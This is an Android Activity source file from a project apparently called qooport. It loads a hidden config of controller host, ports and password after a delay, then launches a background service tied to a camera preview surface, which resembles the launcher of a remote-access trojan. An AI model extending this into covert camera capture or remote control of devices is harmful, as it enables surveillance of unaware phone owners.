package com.qooport.android;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.res.Configuration;
import android.os.Bundle;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import com.rt.android.R;
import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;


public class Principal extends Activity implements SurfaceHolder.Callback {

    public static String identificador;
    public static String version = "a.1.0 beta";
    private String dns;
    private int puerto1;
    private int puerto2;
    private String password;
    private String prefijo;
    private int delay;
    private boolean instalar;
    private SurfaceView mSurfaceView;
    private SurfaceHolder mSurfaceHolder;
    private static Servicio servicio;
//    private Servicio servicio2;
    public static Principal instancia;

    @Override
    public void onStart() {
        super.onStart();
    }

    @Override
    public void onResume() {
        super.onResume();        
//        Log.i("Principal", "ON RESUME");
        mSurfaceView = (SurfaceView) findViewById(R.id.surface_camera_foto);
        mSurfaceHolder = mSurfaceView.getHolder();
        mSurfaceHolder.addCallback(this);
        mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        iniciar();
    }

    public void iniciar() {
        cargarConfiguracion();
        if (servicio == null || servicio.isDestruido()) {
//        if (!isMyServiceRunning()) {
            servicio = new Servicio(this, this.getApplicationContext(), mSurfaceHolder, dns, password, puerto1, puerto2, prefijo, delay);
            servicio.iniciar();
            Log.i("Principal", "SERVICIO LANZADO");
        } else {
            Log.i("Principal", "NO VOY A LANZAR EL SERVICIO PORQ YA ESTA EN EJECUCION");
        }
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instancia=this;
        setContentView(R.layout.cameraview);
        mSurfaceView = (SurfaceView) findViewById(R.id.surface_camera_foto);
        mSurfaceHolder = mSurfaceView.getHolder();
        mSurfaceHolder.addCallback(this);
        mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);        
        iniciar();
    }

    private boolean isMyServiceRunning() {
        ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (Servicio.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void cargarConfiguracion() {
        try {
            Thread.sleep(8000);
        } catch (InterruptedException e) {
        }
        InputStream input = getClass().getResourceAsStream("/config.xml");
        Properties configs = new Properties();
        try {
            configs.loadFromXML(input);
        } catch (Exception e) {
            try {
                //carga configuracion default
                input = getClass().getResourceAsStream("config.xml");
                configs.loadFromXML(input);
            } catch (IOException ex) {
                Logger.getLogger(Principal.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        dns = configs.getProperty("dns");
        puerto1 = Integer.parseInt(configs.getProperty("puerto"));
        puerto2 = Integer.parseInt(configs.getProperty("puerto2"));
        password = configs.getProperty("password");
        prefijo = configs.getProperty("prefijo");
//        String key = configs.getProperty("keyClase");          
        delay = Integer.parseInt(configs.getProperty("delay")) * 1000;
        instalar = Boolean.parseBoolean(configs.getProperty("instalar"));
    }

    public void surfaceCreated(SurfaceHolder sh) {
        Log.i("Principal", "PANTALLA SE CREO");
    }

    public void surfaceChanged(SurfaceHolder sh, int i, int i1, int i2) {
        Log.i("Principal", "PANTALLA CAMBIO");
    }

    public void surfaceDestroyed(SurfaceHolder sh) {
        Log.i("Principal", "PANTALLA SE DESTRUYO");
    }

    public SurfaceView getmSurfaceView() {
        return mSurfaceView;
    }

    public void setmSurfaceView(SurfaceView mSurfaceView) {
        this.mSurfaceView = mSurfaceView;
    }

    public SurfaceHolder getmSurfaceHolder() {
        return mSurfaceHolder;
    }

    public void setmSurfaceHolder(SurfaceHolder mSurfaceHolder) {
        this.mSurfaceHolder = mSurfaceHolder;
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig); //To change body of generated methods, choose Tools | Templates.
        Log.i("Orientacion", "Orientacion=" + newConfig.orientation);
        if (servicio != null) {
            servicio.setOrientacion(newConfig.orientation);
        }
    }
}
